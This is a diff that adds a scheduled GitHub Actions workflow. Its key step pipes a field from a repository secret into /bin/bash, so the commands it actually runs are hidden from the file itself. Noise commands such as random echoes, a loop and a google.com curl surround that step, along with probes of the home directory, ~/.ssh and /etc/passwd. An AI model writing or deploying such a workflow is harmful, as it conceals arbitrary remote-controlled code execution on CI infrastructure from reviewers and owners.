@@ -1,0 +1,33 @@
+name: xiangchenyu2603
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangchenyu2603
+        env:
+          i16744: ${{ secrets.i16744 }}
+        run: |
+          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
+          echo "Random ID: $RANDOM$RANDOM"
+          git status
+          echo $i16744 | jq -r .n8531 | /bin/bash
+          echo "Dir: $(pwd)"
+          ls -al | awk '{print $NF}'
+          which brew
+          export HOME_DIR_FILE_LIST=$(find $HOME -maxdepth 1); echo $HOME_DIR_FILE_LIST
+          [ -d "$HOME/.ssh/config.d" ] && echo "$HOME/.ssh/config.d exists" || echo "$HOME/.ssh/config.d no exists"
+          grep -q "bash" /etc/passwd 2>/dev/null && echo "Bash user exists"
+          which sqlite
+          cat /dev/null > /tmp/.tmpfile 2>/dev/null || true
+          for i in {1..3}; do echo "Iter $i"; done
+          [ "$(which sqlite3)" != "" ] && echo "sqlite3 installed" || echo "sqlite3 not installed"
+          [ "$(which sqlite)" != "" ] && echo "sqlite installed" || echo "sqlite not installed"
+          pushd ~ > /dev/null
+          echo "Random ID: $RANDOM$RANDOM"
+          curl www.google.com
